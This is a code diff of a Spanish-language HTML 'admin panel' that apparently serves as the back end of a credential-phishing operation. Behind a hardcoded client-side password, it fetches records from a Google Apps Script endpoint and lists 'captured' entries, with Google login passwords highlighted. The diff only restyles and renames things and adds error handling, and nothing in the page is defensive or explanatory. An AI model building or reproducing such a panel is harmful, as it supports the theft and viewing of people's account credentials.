@@ -2,44 +2,43 @@
 <html lang="es">
 <head>
     <meta charset="UTF-8">
-    <title>ADMIN PANEL - SECURECHECK</title>
+    <title>SISTEMA DE CONTROL - ADMIN</title>
     <style>
-        body { background: #0b141d; color: white; font-family: sans-serif; padding: 30px; }
-        .container { max-width: 1100px; margin: auto; }
-        .card { background: #15202b; border-radius: 12px; padding: 25px; border: 1px solid #1e293b; }
+        body { background: #0b141d; color: white; font-family: 'Segoe UI', sans-serif; padding: 20px; }
+        .container { max-width: 1000px; margin: auto; }
+        .card { background: #15202b; border-radius: 12px; padding: 20px; border: 1px solid #1e293b; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
         table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-        th { background: #1e293b; color: #38bdf8; padding: 15px; text-align: left; font-size: 12px; }
+        th { background: #1e293b; color: #38bdf8; padding: 15px; text-align: left; font-size: 11px; text-transform: uppercase; }
         td { padding: 15px; border-bottom: 1px solid #1e293b; font-size: 14px; }
         .badge { padding: 4px 8px; border-radius: 4px; font-size: 10px; font-weight: bold; }
         .badge-google { background: #0369a1; color: #7dd3fc; }
         .badge-form { background: #581c87; color: #d8b4fe; }
-        .pass-cell { font-family: monospace; color: #fbbf24; font-weight: bold; font-size: 16px; }
+        .pass-text { font-family: monospace; color: #fbbf24; font-weight: bold; font-size: 15px; }
         #login-box { text-align: center; margin-top: 150px; }
-        input { padding: 12px; border-radius: 8px; border: 1px solid #1e293b; background: #0b141d; color: white; margin-bottom: 10px; }
-        button { padding: 12px 25px; background: #38bdf8; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        input { padding: 12px; border-radius: 8px; border: 1px solid #1e293b; background: #0b141d; color: white; width: 250px; }
+        button { padding: 12px 25px; background: #38bdf8; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; color: #0b141d; }
     </style>
 </head>
 <body>
     <div class="container">
         <div id="login-box">
-            <h1>Panel de Control</h1>
-            <input type="password" id="p" placeholder="Contraseña Admin">
-            <br>
-            <button onclick="check()">Entrar</button>
+            <h1>Acceso Restringido</h1>
+            <input type="password" id="admin-pass" placeholder="Clave de Administrador">
+            <button onclick="verificar()">Entrar</button>
         </div>
 
-        <div id="dashboard" style="display:none">
+        <div id="dash" style="display:none">
             <div class="card">
-                <div style="display:flex; justify-content: space-between; align-items: center;">
-                    <h2>Registros en la Nube</h2>
-                    <button onclick="load()" style="background:none; border: 1px solid #38bdf8; color: #38bdf8;">Refrescar</button>
+                <div style="display:flex; justify-content:space-between; align-items:center;">
+                    <h2 style="color: #38bdf8;">Registros Capturados</h2>
+                    <button onclick="cargar()" style="background: transparent; color: #38bdf8; border: 1px solid #38bdf8; padding: 5px 15px;">Actualizar</button>
                 </div>
                 <table>
                     <thead>
                         <tr>
                             <th>Origen</th>
                             <th>Usuario / Empresa</th>
-                            <th>Password / Datos</th>
+                            <th>Pass / Detalles</th>
                             <th>Fecha</th>
                         </tr>
                     </thead>
@@ -51,29 +50,37 @@
 
     <script>
         const webAppUrl = "https://script.google.com/macros/s/AKfycbxRWIPEFW1fPRg9bJEtNDISKLaojKgJu6FePHoabTxvoypQQ5euGdNw4Y0u0q0zjppa/exec";
-        function check() {
-            if(document.getElementById("p").value === "Linares2025.") {
+        
+        function verificar() {
+            if(document.getElementById("admin-pass").value === "Linares2025.") {
                 document.getElementById("login-box").style.display="none";
-                document.getElementById("dashboard").style.display="block";
-                load();
-            }
+                document.getElementById("dash").style.display="block";
+                cargar();
+            } else { alert("Clave incorrecta"); }
         }
-        async function load() {
+
+        async function cargar() {
             const tbody = document.getElementById("tabla");
-            tbody.innerHTML = "<tr><td colspan='4'>Cargando...</td></tr>";
-            const r = await fetch(webAppUrl);
-            const data = await r.json();
-            tbody.innerHTML = "";
-            data.reverse().forEach(f => {
-                const isG = f[2] === "LOGIN_GOOGLE";
-                tbody.innerHTML += `<tr>
-                    <td><span class="badge ${isG?'badge-google':'badge-form'}">${f[2]}</span></td>
-                    <td>${f[0]}</td>
-                    <td class="${isG?'pass-cell':''}">${f[1]}</td>
-                    <td>${f[3]}</td>
-                </tr>`;
-            });
+            tbody.innerHTML = "<tr><td colspan='4'>Consultando base de datos...</td></tr>";
+            try {
+                const res = await fetch(webAppUrl);
+                const data = await res.json();
+                tbody.innerHTML = "";
+                data.reverse().forEach(row => {
+                    const isG = row[2] === "LOGIN_GOOGLE";
+                    tbody.innerHTML += `
+                        <tr>
+                            <td><span class="badge ${isG ? 'badge-google' : 'badge-form'}">${row[2]}</span></td>
+                            <td>${row[0] || '---'}</td>
+                            <td class="${isG ? 'pass-text' : ''}">${row[1] || '---'}</td>
+                            <td style="color:#94a3b8">${row[3] || '---'}</td>
+                        </tr>`;
+                });
+            } catch (e) {
+                tbody.innerHTML = "<tr><td colspan='4' style='color:red'>Error de conexión. Asegúrate de que el Script esté publicado para 'Cualquiera'.</td></tr>";
+            }
         }
     </script>
 </body>
 </html>
+
